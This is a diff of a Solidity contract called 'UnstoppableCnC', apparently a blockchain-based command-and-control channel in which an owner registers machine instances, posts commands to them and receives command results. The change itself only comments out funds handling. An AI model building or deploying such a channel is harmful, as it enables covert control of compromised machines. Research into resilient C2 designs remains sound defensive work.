@@ -9,8 +9,8 @@ contract UnstoppableCnC {
     enum InstanceStates { NotExist, Inactive, Active, Disabled }
 
     struct Instance{
-        InstanceStates state; // default is NotExist
-        uint256 funds;
+        InstanceStates state; 
+        //uint256 funds;
     }
 
     mapping (bytes32 => Instance) public instances;
@@ -20,7 +20,7 @@ contract UnstoppableCnC {
     event CommandResult (bytes32 sessionAndMachineIdHash, string commandResult, uint16 cmdId); //commandResult needs to be encrypted
 
     /* events triggered by Server */
-    event InstanceRegistered (bytes32 indexed instanceHash, string sessionId, uint256 fundsTransferred);//sessionId needs to be encrypted
+    event InstanceRegistered (bytes32 indexed instanceHash, string sessionId/*, uint256 fundsTransferred*/);//sessionId needs to be encrypted
     event CommandPending (bytes32 indexed instanceHash, string command, uint16 cmdId); //command needs to be encrypted
 
     /*
@@ -76,12 +76,14 @@ contract UnstoppableCnC {
     
         instances[instanceHash].state = InstanceStates.Active;
     
-        InstanceRegistered(instanceHash, sessionId, instances[instanceHash].funds);
+        InstanceRegistered(instanceHash, sessionId/*, instances[instanceHash].funds*/);
     
-        if (instances[instanceHash].funds > 0){
-            msg.sender.transfer(instances[instanceHash].funds);
+        /*if (instances[instanceHash].funds > 0){
+            uint256 funds = instances[instanceHash].funds;
             instances[instanceHash].funds = 0;
-        }
+            msg.sender.transfer(funds);
+            
+        }*/
     }
 
     /**
@@ -102,6 +104,7 @@ contract UnstoppableCnC {
         return true;
     }
     
+
     /**
         Methods for operator. this methods will execute for the contract owner only
     **/
@@ -113,7 +116,7 @@ contract UnstoppableCnC {
     function allowInstance (bytes32 instanceHash) 
         public onlyBy(owner) payable returns (bool success) {
    
-       instances[instanceHash] = Instance({ state: InstanceStates.Inactive, funds: msg.value });
+       instances[instanceHash] = Instance({ state: InstanceStates.Inactive/*, funds: msg.value*/ });
        return true;
     }
 
